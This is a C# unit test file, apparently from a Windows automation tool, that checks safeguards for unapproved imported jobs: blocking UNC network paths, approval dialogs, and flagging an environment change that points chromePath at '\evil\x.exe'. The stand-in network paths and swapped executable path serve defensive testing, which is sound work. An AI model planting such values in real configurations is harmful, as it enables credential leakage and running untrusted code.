        Assert.False(RemotePathGate.IsRemote(@"\\.\C:\video\a.mp4"));
        Assert.False(RemotePathGate.IsRemote(@"\??\C:\video\a.mp4"));
        Environment.SetEnvironmentVariable("B2_UNC_TEST", @"\\may-chu\chia-se");
        try { Assert.True(RemotePathGate.IsRemote(@"%B2_UNC_TEST%\a.mp4")); }
        finally { Environment.SetEnvironmentVariable("B2_UNC_TEST", null); }

        Assert.False(RemotePathGate.IsRemote(@"C:\video\a.mp4"));
        Assert.False(RemotePathGate.IsRemote(@"\\?\C:\video\a.mp4"));
        Assert.False(RemotePathGate.IsRemote("file:///C:/video/a.mp4"));
        Assert.False(RemotePathGate.IsRemote("a.mp4"));
        Assert.False(RemotePathGate.IsRemote(""));
    }

    private static async Task<bool> AllowedInsideRunAsync(string path)
    {
        RemotePathGate.EnterRun();
        await Task.Yield();
        return await Task.Run(() => RemotePathGate.Allows(path));
    }

    [Fact]
    public async Task PreviewDoesNotOpenNetworkPathsWhileBlocked()
    {
        const string unc = @"\\may-chu-b2.invalid\chia-se\video.mp4";
        var dir = NewDir();
        var csv = Path.Combine(dir, "du-lieu.csv");
        File.WriteAllText(csv, "Ten,Tuoi\nAn,30\n");

        Assert.True(RemotePathGate.Allows(unc));
        var block = RemotePathGate.Block();
        try
        {
            Assert.False(RemotePathGate.Allows(unc));
            Assert.True(RemotePathGate.Allows(csv));

            var ex = Assert.Throws<IOException>(() => TabularReader.Read(@"\\may-chu-b2.invalid\chia-se\du-lieu.xlsx"));
            Assert.Contains(RemotePathGate.BlockedMessage, ex.Message);
            Assert.Throws<IOException>(() => TabularReader.SheetNames(@"\\may-chu-b2.invalid\chia-se\du-lieu.xlsx"));
            Assert.Single(TabularReader.Read(csv).Rows);                     // file trên máy vẫn đọc được

            var plan = await MediaInfo.AnalyzeAsync([unc], null);
            Assert.Equal(RemotePathGate.BlockedMessage, Assert.Single(plan.Entries).Problem);
            Assert.Null(await MediaInfo.GetDurationAsync(unc));
            Assert.Null(await MediaThumbnails.GetAsync(unc, 64));

            // Flow chạy thật (đã duyệt) không bị chặn — và đánh dấu đó không lọt ra ngoài lần chạy.
            Assert.True(await AllowedInsideRunAsync(unc));
            Assert.False(RemotePathGate.Allows(unc));

            using (RemotePathGate.Block()) Assert.True(RemotePathGate.IsBlocking); // lồng nhau
            Assert.True(RemotePathGate.IsBlocking);
        }
        finally
        {
            block.Dispose();
            block.Dispose(); // gọi hai lần không làm lệch bộ đếm
        }
        Assert.False(RemotePathGate.IsBlocking);
        Assert.True(RemotePathGate.Allows(unc));
    }

    private static void Sta(Action action)
    {
        Exception? error = null;
        var t = new Thread(() =>
        {
            try { action(); }
            catch (Exception ex) { error = ex; }
        });
        t.SetApartmentState(ApartmentState.STA);
        t.Start();
        t.Join();
        if (error != null) throw new Exception(error.ToString());
    }

    private static IEnumerable<Control> Descendants(Control root)
    {
        foreach (Control c in root.Controls)
        {
            yield return c;
            foreach (var d in Descendants(c)) yield return d;
        }
    }

    [Fact]
    public void EditorShowsBannerAndBlocksNetworkPreviewForPendingJob()
    {
        Sta(() =>
        {
            var ui = new FakeUi();
            var pending = Pending("Từ Telegram", S(StepType.PlayMedia, s => s.Text = @"\\may-chu-b2.invalid\chia-se\video.mp4"));
            using (var f = new JobEditorForm(pending.Clone(), new FlowRunner(ui, _ => null), [pending], ui, isNew: false)
                   { StartPosition = FormStartPosition.Manual, Location = new Point(-20000, -20000) })
            {
                f.Show();
                Application.DoEvents();
                Assert.True(RemotePathGate.IsBlocking);
                var banner = Descendants(f).OfType<Label>().Single(l => l.Text.StartsWith("⚠ Chờ duyệt"));
                Assert.Contains("(Tạo qua Telegram 05/10 14:32)", banner.Text);
                Assert.True(banner.Visible);
                Assert.Contains(Descendants(f).OfType<Button>(), b => b.Text == "✔ Duyệt…" && b.Visible);
                Assert.False(f.HasUnsavedChanges);
            }
            Assert.False(RemotePathGate.IsBlocking);

            var approved = new Job { Name = "Của tôi", Steps = [LogStep("a")] };
            using (var f = new JobEditorForm(approved, new FlowRunner(ui, _ => null), [approved], ui, isNew: false))
            {
                Assert.False(RemotePathGate.IsBlocking);
                Assert.DoesNotContain(Descendants(f).OfType<Label>(), l => l.Text.StartsWith("⚠ Chờ duyệt"));
            }
        });
    }

    [Fact]
    public void ApprovalDialogShowsSummaryAndHasNoDefaultApprove()
    {
        Sta(() =>
        {
            var job = RiskyJob();
            JobApproval.Require(job, "Tạo qua Telegram 05/10 14:32");
            using var f = new ApprovalForm("Duyệt công việc", "giải thích", JobApproval.Summary(job), "✔ Duyệt và chạy");
            var box = Descendants(f).OfType<TextBox>().Single();
            Assert.True(box.ReadOnly);
            Assert.Contains("⚠ 2. Chạy lệnh: " + LongCommand, box.Text);
            Assert.Null(f.AcceptButton); // Enter không vô tình duyệt
            var approve = Descendants(f).OfType<Button>().Single(b => b.Text == "✔ Duyệt và chạy");
            Assert.Equal(DialogResult.OK, approve.DialogResult);
            Assert.Equal(DialogResult.Cancel, ((Button)f.CancelButton!).DialogResult);
        });
    }

    // ───────────────────────────── Nhập thư mục kịch bản: môi trường, đếm đúng, gọi công việc có sẵn ─────────────────────────────

    [Fact]
    public void EnvironmentChangesFromFolderAreListedForApproval()
    {
        var current = new List<TestEnvironment>
        {
            new() { Name = "UAT", Variables = [new VariableDef { Name = "chromePath", Value = @"C:\Chrome\chrome.exe" }, new VariableDef { Name = "cu", Value = "1" }] },
            new() { Name = "Dev", Variables = [new VariableDef { Name = "url", Value = "https://dev" }] }
        };
        var incoming = new List<TestEnvironment>
        {
            new() { Name = " uat ", Variables = [new VariableDef { Name = "chromePath", Value = @"\evil\x.exe" }, new VariableDef { Name = "moi", Value = "2" }] },
            new() { Name = "Dev", Variables = [new VariableDef { Name = "url", Value = "https://dev" }] },
            new() { Name = "Prod", Variables = [new VariableDef { Name = "url", Value = "https://prod" }] }
        };
        var lines = TestFolder.DescribeEnvironmentChanges(current, incoming);
        Assert.Contains("Môi trường \"uat\":", lines);
        Assert.Contains(@"   ~ chromePath: C:\Chrome\chrome.exe → \evil\x.exe", lines);
        Assert.Contains("   + moi = 2", lines);
        Assert.Contains("   − cu", lines);
        Assert.Contains("Môi trường \"Prod\" (mới):", lines);
        Assert.DoesNotContain(lines, l => l.Contains("Dev"));                                   // không đổi → không hỏi
        Assert.Empty(TestFolder.DescribeEnvironmentChanges(current, [current[1]]));
    }

    [Fact]
    public void FolderImportCountsMatchMerge()
    {
        var normal = new Job { Name = "Công việc thường", Steps = [LogStep("a")] };
        var oldCase = TestCase("Kịch bản cũ");
        var current = new List<Job> { normal, oldCase };
        var clash = TestCase("Trùng Id công việc thường");
        clash.Id = normal.Id;
        var update = TestCase("Kịch bản cũ (sửa)");
        update.Id = oldCase.Id;
        var incoming = new List<Job> { clash, update, TestCase("Mới") };

        var (updated, added, skipped) = TestFolder.PreviewMerge(current, incoming);
        var r = TestFolder.Merge(current, incoming);
        Assert.Equal((r.Updated, r.Added, r.Skipped), (updated, added, skipped.Count));
        Assert.Equal((1, 1, 1), (updated, added, skipped.Count));
        Assert.Equal(["Công việc thường"], skipped);
    }

    [Fact]
    public void CallToExistingJobShowsItsRealName()
    {
        // File ghi nhãn "Ghi nhật ký" nhưng JobRef trỏ tới công việc đã duyệt "Dọn dữ liệu D365" có sẵn trên máy.
        var existing = new Job { Name = "Dọn dữ liệu D365", Steps = [LogStep("x")] };
        var imported = new Job
        {
            Name = "Mỗi giờ",
            OnFailureJobId = existing.Id,
            Steps = [LogStep("a"), S(StepType.CallJob, s => { s.JobRef = existing.Id; s.Target = "Ghi nhật ký"; })]
        };
        JobApproval.Require(imported, "Nhập từ file x.json");
        List<Job> all = [existing, imported];

        var summary = JobApproval.Summary(imported, all);
        Assert.Contains("⚠ 2. Chạy công việc \"Dọn dữ liệu D365\" (nhãn trong file ghi \"Ghi nhật ký\" — KHÁC tên thật)", summary);
        Assert.Contains("ĐÃ DUYỆT có sẵn trên máy", summary);

        var bulk = JobApproval.ImportSummary([imported], all);
        Assert.Contains("⚠ 2. Chạy công việc \"Dọn dữ liệu D365\"", bulk);
        Assert.Contains("↪ Khi lỗi chạy: Dọn dữ liệu D365 — công việc ĐÃ DUYỆT có sẵn trên máy", bulk);
    }

    [Fact]
    public void PendingTestCaseDataFileIsNotOpened()
    {
        // Kịch bản chờ duyệt có file dữ liệu ở máy lạ: chạy bộ kiểm thử phải từ chối ngay, không đọc file (không gửi thông tin đăng nhập).
        var job = TestCase("Chờ duyệt");
        job.DataFile = @"\may-chu-b4a.invalid\chia-se\du-lieu.xlsx";
        JobApproval.Require(job, "Nhập từ thư mục kịch bản");
        var run = Assert.Single(TestSuite.Runs(job, SuiteOptions.Default));
        Assert.Contains("đang chờ duyệt", run.Error);
    }
}
